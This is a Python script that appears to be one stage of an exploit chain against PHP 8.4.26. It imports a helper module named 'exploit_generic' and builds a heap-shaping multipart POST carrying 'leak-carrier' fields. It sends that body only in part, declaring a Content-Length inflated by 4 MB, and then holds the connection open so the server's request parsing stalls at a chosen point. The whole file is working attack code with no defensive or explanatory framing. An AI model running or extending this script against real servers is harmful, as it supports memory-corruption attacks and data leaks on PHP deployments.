#!/usr/bin/env python3
"""Pause the phase-1 B request after all leak-carrier fields were parsed."""

from __future__ import annotations

import argparse
from pathlib import Path
import socket
import sys
import time


HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE))

import exploit_generic as exploit  # noqa: E402


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", required=True)
    parser.add_argument("--pause", type=float, default=30.0)
    parser.add_argument("--set", action="append", default=[], dest="assignments")
    args = parser.parse_args()
    profile = exploit.load_profile(
        "php-8.4.26-amd64", None, args.assignments
    )
    target = exploit.Target.parse(args.url)
    body, boundary = exploit.build_heap_b(profile)
    closing = b"--" + boundary + b"--\r\n"
    if not body.endswith(closing):
        raise RuntimeError("unexpected multipart terminator")
    partial = body[: -len(closing)]
    partial += (
        b"--"
        + boundary
        + b'\r\nContent-Disposition: form-data; name="hold"\r\n\r\n'
        + b"H" * 65536
    )
    declared_length = len(partial) + 4 * 1024 * 1024
    header = (
        f"POST {target.path} HTTP/1.1\r\n"
        f"Host: {target.host_header}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary.decode('ascii')}\r\n"
        f"Content-Length: {declared_length}\r\n"
        "Connection: close\r\n\r\n"
    ).encode("ascii")
    connection = socket.create_connection(
        (target.connect_host, target.port), timeout=30.0
    )
    connection.settimeout(30.0)
    connection.sendall(header)
    for offset in range(0, len(partial), 262_144):
        connection.sendall(partial[offset : offset + 262_144])
    print(
        f"B_PAUSED sent={len(partial)} declared={declared_length}", flush=True
    )
    time.sleep(args.pause)
    connection.close()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
